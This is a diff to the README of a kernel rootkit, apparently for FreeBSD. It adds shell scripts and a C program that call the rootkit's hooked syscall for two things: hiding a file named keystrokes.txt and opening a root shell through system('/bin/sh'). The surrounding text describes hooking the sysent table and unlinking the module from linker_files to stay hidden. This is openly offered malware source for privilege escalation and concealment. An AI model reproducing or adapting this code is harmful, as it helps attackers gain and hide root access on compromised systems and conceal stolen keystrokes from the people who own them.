@@ -35,6 +35,25 @@ There is an API structure allowing for interaction with the rootkit. For
 example calling the syscall with the argument '1' will load all of the hooked
 syscalls into the sysent table, and argument '2' will restore them back to
 normal. This API style is used to make script writing easier/more intuitive.
+The aforementioned API style acts in the following way. When `./install` is 
+run it accesses the API to alter syscalls and hide important files like so:
+
+```bash
+#!/bin/sh
+./add.sh keystrokes.txt
+```
+
+The `add.sh` script then acts in the following way to access our API and hide
+the relevant file:
+
+```bash
+#!/bin/sh
+sys_num=$(cat /etc/good_luck_finding_this/syscall_number.txt)
+./syscall $sys_num 4 $1
+```
+
+This is then passed to one of our binaries _./syscall_ which passes it along 
+to the C function _syscall()_ with the appropriate function.
 
 ### How The Rootkit Escalates Privelege/Gets Root Access
 
@@ -47,6 +66,35 @@ running as `root`. After these IDs are set the function `system("/bin/sh")` is
 called to open a shell, which will be a root shell because the IDs are set
 accordingly.
 
+Similarly to installation, elevate calls our API to open a root shell 
+(code _3_).
+
+```bash
+#!/bin/sh
+sys_num=$(cat /etc/good_luck_finding_this/syscall_number.txt)
+./syscall $sys_num 3
+```
+
+Our `./syscall` binary is written such that when asked to open a root shell, 
+it sets the relevant permissions and then calls a shell. In the below code 
+this means that the syscall sets permissions, and then a special case for cmd 
+code '3' triggers a shell.
+
+```C
+int main(int argc, char ** argv)
+{
+    int syscall_num = atoi(argv[1]);
+    int cmd = atoi(argv[2]);
+    char ** newArgs = &argv[3];
+
+    int errcode = syscall(syscall_num, cmd, newArgs);
+    if (cmd == 3) system("/bin/sh");
+
+    return errcode;
+}
+```
+
+
 ### How The Rootkit Hides Itself
 
 There are a few methods that our rootkit uses to attempt to hide itself from
@@ -58,7 +106,7 @@ our created syscall. The mentioned hooked syscalls check these flags to see if
 they can be read from, written to, or viewed via 'ls.' For example if the
 rootkit is installed, and the filename 'test' is added to the struct with a
 R_FLAG_READ only flag; any file named 'test' will be unseeable via 'ls', can't
-be written to, but CAN be read from (such as 'cat test').
+be written to, but CAN be read from (such as `$ cat test`).
 
 The second way that the Rootkit can hide itself is by unlinking the created
 kernel module from the linker_files list. On load, the kernel module will
